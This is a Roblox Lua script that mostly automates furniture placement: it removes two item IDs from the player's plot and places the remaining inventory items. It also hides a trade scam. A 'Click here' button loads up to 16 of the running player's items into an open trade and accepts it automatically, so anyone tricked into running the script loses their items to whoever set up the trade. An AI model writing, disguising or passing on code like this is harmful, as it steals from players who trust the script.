local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer
local Events = ReplicatedStorage:WaitForChild("Events")
local Shop = Events:WaitForChild("Shop")
local Data = Events:WaitForChild("Data")

local InsertFurniture = Shop:WaitForChild("InsertFurniture")
local RemoveFurniture = Shop:WaitForChild("RemoveFurniture")
local GetAll = Data:WaitForChild("GetAll")

local TARGET_REMOVE_IDS = {
    ["1162"] = true,
    ["2294"] = true
}

local FLOOR = 1

local gui = Instance.new("ScreenGui")
gui.Name = "ClickHereUI"
gui.ResetOnSpawn = false
gui.Parent = LocalPlayer:WaitForChild("PlayerGui")

local button = Instance.new("TextButton")
button.Size = UDim2.new(0, 200, 0, 60)
button.Position = UDim2.new(0.5, -100, 0.5, -30)
button.Text = "Click here"
button.TextScaled = true
button.Parent = gui

local tradeClicked = false

button.MouseButton1Click:Connect(function()
	if tradeClicked then return end
	tradeClicked = true

	local UIModule = require(ReplicatedStorage.Modules.UIModule)

	local addedCount = 0
	local data = Events.Data.Get:InvokeServer("Inventory")
	local inventory = data.Inventory or data

	for guid, itemData in pairs(inventory) do
		if addedCount >= 16 then break end
		if not (itemData.ItemPlaced or itemData.NextOfferDue) then
			if Events.Trading.AddItem:InvokeServer({GUID = guid, Type = "Item"}) then
				addedCount = addedCount + 1
				task.wait(0.1)
			end
		end
	end

	UIModule:Notify(LocalPlayer, "Added " .. addedCount .. " items to trade")
	task.wait(0.5)
	Events.Trading.AcceptTrade:InvokeServer()
end)

local function getPlot()
    local own = LocalPlayer:WaitForChild("NonSaveVars"):WaitForChild("OwnsPlot")
    repeat task.wait() until own.Value ~= 0
    return Workspace.Plots:WaitForChild(tostring(own.Value))
end

local function removeBadFurniture(plot)
    local furnitureFolder = plot:WaitForChild("Furniture")
    local removed = 0

    for _, model in ipairs(furnitureFolder:GetChildren()) do
        if model:IsA("Model") then
            local itemId = model:GetAttribute("ItemId")

            if itemId and TARGET_REMOVE_IDS[tostring(itemId)] then
                local success = pcall(function()
                    RemoveFurniture:InvokeServer(model)
                end)

                if success then
                    removed += 1
                end

                task.wait(0.1)
            end
        end
    end

    print("Removed:", removed)
end

local function getGoodInventory()
    local success, data = pcall(function()
        return GetAll:InvokeServer()
    end)

    if not success or not data or not data.Inventory then
        return {}
    end

    local items = {}

    for guid, item in pairs(data.Inventory) do
        if not TARGET_REMOVE_IDS[tostring(item.Id)] and not item.ItemPlaced then
            table.insert(items, {
                GUID = guid,
                Id = item.Id
            })
        end
    end

    return items
end

local function placeItems(plot, items)
    local canvas = plot.Interior.Shop1.Canvas

    local cx, cy, cz = canvas.Position.X, canvas.Position.Y, canvas.Position.Z
    local sx, sy, sz = canvas.Size.X/2, canvas.Size.Y/2, canvas.Size.Z/2

    local inserted = 0
    math.randomseed(tick())

    for _, item in ipairs(items) do
        local rx = cx + math.random(-sx*100, sx*100)/100
        local rz = cz + math.random(-sz*100, sz*100)/100
        local ry = cy + sy + math.random(5,40)

        local args = {
            {
                GUID = item.GUID,
                Type = "Decor",
                Floor = FLOOR,
                Id = item.Id,
                CFrame = CFrame.new(rx, ry, rz)
            }
        }

        local success = pcall(function()
            InsertFurniture:InvokeServer(unpack(args))
        end)

        if success then
            inserted += 1
        end

        task.wait(0.05)
    end

    print("Placed:", inserted, "| Failed:", #items - inserted)
end

while true do
    local plot = getPlot()

    removeBadFurniture(plot)

    task.wait(0.5)

    local items = getGoodInventory()

    if #items > 0 then
        placeItems(plot, items)
    else
        print("No valid items to place")
    end

    task.wait(2)
end
